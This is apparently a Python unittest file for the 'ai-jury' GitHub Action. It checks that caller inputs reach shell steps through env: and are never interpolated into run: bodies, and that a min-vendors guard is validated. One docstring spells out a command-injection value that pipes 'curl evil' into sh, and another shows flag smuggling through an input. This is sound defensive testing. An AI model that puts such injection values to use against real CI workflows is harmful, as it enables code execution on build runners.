"""Unit tests for action.yml GitHub Action definition."""

from __future__ import annotations

import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent


class GitHubActionTests(unittest.TestCase):
    def test_action_file_exists_and_valid(self):
        action_path = REPO_ROOT / "action.yml"
        self.assertTrue(action_path.exists(), "action.yml must exist in root")

        content = action_path.read_text(encoding="utf-8")
        self.assertIn('name: "ai-jury Review"', content)
        self.assertIn('using: "composite"', content)
        self.assertIn("github-token:", content)
        self.assertIn("openai-api-key:", content)
        self.assertIn("anthropic-api-key:", content)
        self.assertIn("gemini-api-key:", content)
        self.assertIn("jury --pr", content)


class NoCallerInputReachesAShellBody(unittest.TestCase):
    """A `${{ }}` expression inside `run:` is substituted before bash parses it.

    So a caller-supplied value carrying a quote and a `;` becomes shell code:
    `version: '1.0"; curl evil | sh; "'` executes. #584 moved four inputs into
    `env:` for exactly this reason and left `inputs.version` behind — the sweep
    it described in the plural was done in the singular.

    Asserted as a rule over every step rather than as one line, because the
    single-line version is what let the fifth input slip through, and the next
    step someone adds is the same coin flip.
    """

    def _blocks(self, key: str) -> list[tuple[int, list[str]]]:
        """Bodies of every ``<key>:`` block in action.yml, as (line number, lines).

        A block scalar's body is the run of following lines indented deeper than
        the key that opened it, blank lines included — plus whatever trails the
        key on its own line, so a one-line ``run: cmd`` is swept like a ``run: |``
        block rather than read as an empty body. That is all this test needs
        from the file, so it reads it directly rather than through a YAML parser:
        ai-jury declares ``dependencies = []`` and three dev tools, and a test is
        not a good enough reason to make PyYAML the exception.

        The cost of hand-reading is that a restructured ``action.yml`` could go
        unrecognised and quietly sweep nothing, so
        :meth:`test_the_sweep_covers_every_run_body_in_the_file` pins the counts
        against the file's own text instead of trusting this scan.
        """
        lines = (REPO_ROOT / "action.yml").read_text(encoding="utf-8").splitlines()
        blocks: list[tuple[int, list[str]]] = []
        for index, line in enumerate(lines):
            stripped = line.lstrip()
            if not stripped.startswith(f"{key}:"):
                continue
            indent = len(line) - len(stripped)
            inline = stripped[len(key) + 1 :].strip()
            body: list[str] = [inline] if inline not in ("", "|", ">", "|-", ">-") else []
            for following in lines[index + 1 :]:
                if following.strip() and len(following) - len(following.lstrip()) <= indent:
                    break
                body.append(following)
            blocks.append((index + 1, body))
        return blocks

    def test_no_step_interpolates_an_expression_into_its_run_body(self):
        offenders = [
            (line_number, body_line.strip())
            for line_number, body in self._blocks("run")
            for body_line in body
            if "${{" in body_line
        ]
        self.assertEqual(
            [],
            offenders,
            "a GitHub expression is substituted into a shell body; pass it through "
            f"`env:` and reference it as a shell variable instead: {offenders}",
        )

    def test_the_sweep_covers_every_run_body_in_the_file(self):
        """Keeps the assertion above from passing vacuously after a refactor.

        Counted against the raw text, not the scan: if a restructured action.yml
        left a `run:` the block reader could not see, "no offenders" would be an
        artefact of reading nothing. Both numbers must move together.
        """
        text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")
        blocks = self._blocks("run")
        self.assertEqual(
            text.count("\n      run:"),
            len(blocks),
            "the block reader did not find every run: in action.yml; the sweep "
            "is checking less of the file than it appears to",
        )
        self.assertTrue(
            all(any(body_line.strip() for body_line in body) for _, body in blocks),
            "a run: block read as empty; the sweep would pass over it vacuously",
        )

    def test_every_caller_supplied_input_arrives_through_env(self):
        """The positive half: inputs must still reach the script, just safely."""
        env_values = "\n".join("\n".join(body) for _, body in self._blocks("env"))
        for name in ("inputs.version", "inputs.args", "inputs.github-token"):
            with self.subTest(input=name):
                self.assertIn(
                    name,
                    env_values,
                    f"{name} no longer reaches any step through env:",
                )


class TheActionDoesNotShipAFailSoftPanel(unittest.TestCase):
    """#682: a consumer of `berkayturanci/ai-jury@…` inherited fail-soft.

    `args` defaulted to `--auto --post` and `--min-vendors` was off, so an
    Action user got a run that exits 0 on a panel that collapsed to one vendor
    — while the marketing on the tin says cross-vendor. The guard is now an
    explicit input so it is visible in the Action's own documentation, and
    defaulted so nobody has to know to ask for it.

    Read from the file's text for the same reason the sweep above is: this
    project ships `dependencies = []`, and a test is not a good enough reason
    to make PyYAML the exception.
    """

    def setUp(self):
        self.text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")

    def test_the_input_exists_and_defaults_to_two(self):
        self.assertIn("min-vendors:", self.text)
        block = self.text.split("min-vendors:", 1)[1].split("version:", 1)[0]
        self.assertIn('default: "2"', block)

    def test_the_guard_is_appended_to_both_invocations(self):
        """PR mode and diff-file mode; missing it on one is missing it."""
        self.assertIn('jury --pr "$PR_NUM" $INPUT_ARGS $GUARD', self.text)
        self.assertIn("jury --diff-file - $INPUT_ARGS $GUARD", self.text)

    def test_an_explicit_caller_choice_is_not_overridden(self):
        """Passing the flag through `args` must not produce it twice."""
        self.assertIn('*" --min-vendors "*|*" --no-min-vendors "*) GUARD="" ;;', self.text)

    def test_the_value_is_validated_before_it_is_word_split(self):
        """It is caller-supplied and lands unquoted in the command line.

        Without the digit check, `min-vendors: "--post"` would smuggle a flag
        into the invocation — the same class of hole #584 closed for `version`,
        one layer down.
        """
        self.assertIn("''|*[!0-9]*)", self.text)

    def test_it_travels_through_env_like_every_other_input(self):
        """Never as a `${{ }}` inside `run:` — see the sweep above."""
        self.assertIn("INPUT_MIN_VENDORS: ${{ inputs.min-vendors }}", self.text)


if __name__ == "__main__":
    unittest.main()
